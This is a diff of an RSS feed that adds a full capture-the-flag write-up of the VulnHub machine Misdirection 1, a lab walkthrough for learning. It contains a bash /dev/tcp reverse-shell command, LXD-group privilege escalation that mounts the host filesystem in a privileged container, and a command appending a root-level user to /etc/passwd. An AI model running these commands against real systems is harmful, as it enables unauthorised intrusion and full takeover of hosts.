@@ -1,21 +1,137 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Writeable Passwd on ikuamike</title>
-    <link>https://blog.ikuamike.io/tags/writeable-passwd/</link>
-    <description>Recent content in Writeable Passwd on ikuamike</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <copyright>© Michael Ikua</copyright>
-    <lastBuildDate>Wed, 21 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/writeable-passwd/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Vulnub: Misdirection 1</title>
-      <link>https://blog.ikuamike.io/posts/2021/misdirection1/</link>
-      <pubDate>Wed, 21 Apr 2021 00:00:00 +0000</pubDate>
-      
-      <guid>https://blog.ikuamike.io/posts/2021/misdirection1/</guid>
-      <description></description>
-    </item>
-    
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Writeable Passwd on ikuamike</title><link>https://blog.ikuamike.io/tags/writeable-passwd/</link><description>Recent content in Writeable Passwd on ikuamike</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>© Michael Ikua</copyright><lastBuildDate>Wed, 21 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/writeable-passwd/index.xml" rel="self" type="application/rss+xml"/><item><title>Vulnub: Misdirection 1</title><link>https://blog.ikuamike.io/posts/2021/misdirection1/</link><pubDate>Wed, 21 Apr 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/misdirection1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection.png" class="center" style="border-radius: 8px;" />
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Difficulty&lt;/th>
+&lt;th>Release Date&lt;/th>
+&lt;th>Author&lt;/th>
+&lt;th>Machine link&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Beginner&lt;/td>
+&lt;td>24 Sep 2019&lt;/td>
+&lt;td>FalconSpy&lt;/td>
+&lt;td>&lt;a href="https://vulnhub.com/entry/misdirection-1,371/">https://vulnhub.com/entry/misdirection-1,371/&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>For this box, initial access was a web shell discovered. Then with low priv shell we could run bash as brexit user
+and were able to pivot to that account. Once we are brexit user, we abuse his membership to the lxd to start a
+privileged container that can read and write the whole file system by mounting it in the container.&lt;/p>
+&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;p>Nmap&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.136
+Host is up &lt;span style="color:#f92672">(&lt;/span>0.00032s latency&lt;span style="color:#f92672">)&lt;/span>.
+Not shown: &lt;span style="color:#ae81ff">65531&lt;/span> closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+80/tcp open http Rocket httpd 1.2.6 &lt;span style="color:#f92672">(&lt;/span>Python 2.7.15rc1&lt;span style="color:#f92672">)&lt;/span>
+3306/tcp open mysql MySQL &lt;span style="color:#f92672">(&lt;/span>unauthorized&lt;span style="color:#f92672">)&lt;/span>
+8080/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="8080-http">8080 (HTTP)&lt;/h2>
+&lt;p>Nmap&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e"># Nmap 7.91 scan initiated Wed Apr 14 06:31:44 2021 as: nmap -n -Pn -sV -p 8080 --script default,http-enum,http-shellshock,http-backup-finder,http-config-backup --append-output -oN recon-misdirection1/misdirection1-8080-httpnmap.enum 192.168.191.136&lt;/span>
+Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.136
+Host is up &lt;span style="color:#f92672">(&lt;/span>0.00026s latency&lt;span style="color:#f92672">)&lt;/span>.
+PORT STATE SERVICE VERSION
+8080/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
+| http-enum:
+| /wordpress/: Blog
+| /wordpress/wp-login.php: Wordpress login page.
+| /css/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
+| /debug/: Potentially interesting folder
+| /development/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
+| /help/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
+| /images/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
+| /js/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
+| /manual/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
+|_ /scripts/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
+|_http-server-header: Apache/2.4.29 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>ffuf&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.191.136:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style="color:#ae81ff">50&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">js &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 322, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+help &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 324, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+wordpress &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 329, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+manual &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 326, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+debug &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 325, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+development &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 331, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+shell &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 325, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+images &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 326, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+css &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 323, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+scripts &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 327, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+server-status &lt;span style="color:#f92672">[&lt;/span>Status: 403, Size: 305, Words: 22, Lines: 12&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>Status: 200, Size: 10918, Words: 3499, Lines: 376&lt;span style="color:#f92672">]&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>After some directory bruteforcing on both port 80 and 8080 I discovered several directories. On port 8080 the debug directory
+contains a web shell.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-1.png" class="center" style="border-radius: 8px;" />
+&lt;h1 id="shell-as-www-data">Shell as www-data&lt;/h1>
+&lt;p>Supplying the following command we are able to get a reverse shell.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">bash -c &lt;span style="color:#e6db74">&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>shell:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-2.png" class="center" style="border-radius: 8px;" />
+&lt;p>After some basic enumeration we discover www-data has sudo permissions to run /bin/bash as brexit user without
+any password requirement.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-3.png" class="center" style="border-radius: 8px;" />
+&lt;h1 id="shell-as-brexit">Shell as brexit&lt;/h1>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo -u brexit /bin/bash
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-4.png" class="center" style="border-radius: 8px;" />
+&lt;p>On running id we see that brexit is in the lxd group and no images are present.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-10.png" class="center" style="border-radius: 8px;" />
+&lt;h1 id="shell-as-root">Shell as root&lt;/h1>
+&lt;p>Brexit being in the lxd group allows for privilege escalation. First we need to add am image then create a container.&lt;/p>
+&lt;p>First we need to get distrobuilder, the compile it. This uses go to compile therefore you need go to be installed.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wget https://github.com/lxc/distrobuilder/archive/refs/tags/distrobuilder-1.2.zip
+7z x distrobuilder-1.2.zip
+cd distrobuilder-distrobuilder-1.2
+make
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>You can use go get as the repo instructions recommend but for me it didn&amp;rsquo;t work as expected.&lt;/p>
+&lt;p>With distrobuilder ready, download the alpine image yaml file to build a small alpine image for lxd&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then run distrobuilder with the alpine yaml file as below.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo ~/bin/distrobuilder build-lxd alpine.yaml -o image.release&lt;span style="color:#f92672">=&lt;/span>3.8
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will result in two files: lxd.tar.xz and rootfs.squashfs.&lt;/p>
+&lt;p>We then need to transfer this two files to our victim for privesc.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e"># on kali&lt;/span>
+python3 -m http.server
+&lt;span style="color:#75715e"># on victim&lt;/span>
+wget 192.168.191.1:8000/lxd.tar.xz
+wget 192.168.191.1:8000/rootfs.squashfs
+lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+lxc image list
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-5.png" class="center" style="border-radius: 8px;" />
+&lt;p>After adding the image we need to run lxd init and can keep everything default.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">lxd init
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-7.png" class="center" style="border-radius: 8px;" />
+&lt;p>Then create the container to be privileged and mount the host os file system inside it.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">lxc init alpine privesc -c security.privileged&lt;span style="color:#f92672">=&lt;/span>true
+lxc config device add privesc host-root disk source&lt;span style="color:#f92672">=&lt;/span>/ path&lt;span style="color:#f92672">=&lt;/span>/mnt/root recursive&lt;span style="color:#f92672">=&lt;/span>true
+lxc start privesc
+lxc exec privesc /bin/sh
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>With this we can read the host file system from inside the container and can read root.txt.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-8.png" class="center" style="border-radius: 8px;" />
+&lt;p>To get shell as root I added a public key to authorized_keys of the root user and can ssh in as root.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-9.png" class="center" style="border-radius: 8px;" />
+&lt;h1 id="extras">Extras&lt;/h1>
+&lt;p>After looking at other writeups, there was another easy privesc that I didn&amp;rsquo;t explore.&lt;/p>
+&lt;ul>
+&lt;li>Writeable /etc/passwd file&lt;/li>
+&lt;/ul>
+&lt;p>The passwd file is writeable by the users in the brexit group.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-11.png" class="center" style="border-radius: 8px;" />
+&lt;p>We can add user with id 0 that will give us root privileges.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">openssl passwd -1 -salt user password123
+echo &lt;span style="color:#e6db74">&amp;#39;user:$1$user$nY3qj2koDQU1.5HG4ZTj9/:0:0:User:/root:/bin/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt;/etc/passwd
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-12.png" class="center" style="border-radius: 8px;" />
+&lt;h1 id="references">References&lt;/h1>
+&lt;p>&lt;a href="https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/">https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd">https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd&lt;/a>&lt;/p></content></item></channel></rss>
